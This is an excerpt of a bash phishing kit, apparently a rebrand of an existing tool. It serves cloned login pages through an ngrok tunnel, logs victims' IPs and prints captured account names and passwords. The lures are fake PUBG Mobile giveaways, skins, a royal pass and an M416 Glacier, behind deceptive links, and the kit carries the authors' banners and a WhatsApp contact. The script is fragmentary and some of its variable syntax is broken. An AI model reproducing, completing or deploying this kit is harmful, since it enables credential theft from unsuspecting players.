...
banner() {
	cat <<- EOF
	${BLUE}TOOL DEVELOPED BY SUICIDE SQUAD

${GREEN}_| | | |  \/  |_ _/ ___| / _ \  |  _ \/ ___|  / \
 $(GREEN} | | | | | | |\/| || |\___ \| | | | | |_) \___ \ / _ \
 ${GREEN} | | | |_| | |  | || | ___) | |_| | |  _ < ___) / ___ \
  $(GREEN}|_|  \___/|_|  |_|___|____/ \___/  |_| \_\____/_/   \_\
${ORANGE} ------♦BRING WORLD CLOSER♦------                
	EOF
}
## Small Banner
banner_savage() {
...
${ORANGE} 
${ORANGE} ████████████████████████████████████████████████ 
${ORANGE} █ ${RED}___  _  _ _ ____ _  _ _ _  _ ____ ${MAGENTA}TUMISORSA${ORANGE}█
${ORANGE} █ ${RED}|__] |__| | [__  |__| | |\ | | __ ${MAGENTA}WhatsApp   ${ORANGE}█
${ORANGE} █ ${RED}|    |  | | ___] |  | | | \| |__] ${MAGENTA}+27617941531${ORANGE}█
${ORANGE} █                                              ${ORANGE}█
${ORANGE} ████████████████████████████████████████████████
	EOF
}
...
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${SAVAGERSA} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}
...
setup_site() {
	...
	cp -rf TumisoRsa/"$website"/* .server/www
	cp -f SavageRsa/ip.php .server/www/
...
capture_creds() {
	...
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$Trazim"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$Tiiepecy083"
...
${RED}[${WHITE}03${RED}]${ORANGE} link Editor M416 Glacier	
	...
	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="facebook"
		savagersa='http://pubg-mobile-skin'
		tunnel_menu
        elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
	        website="Pubg"
		savagersa='http://pubg-mobile-royalpass'
		tunnel_menu
        elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
	        website="Testing"
		savagersa='http://pubg-mobile-glacier'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
...
${RED}[${WHITE}00${RED}]${ORANGE} Exit
 ...
 ${RED}DEVELOPED BY TUMISOSAVAGERSA
## Main
Tumiso_Rsa
dependencies
install_ngrok
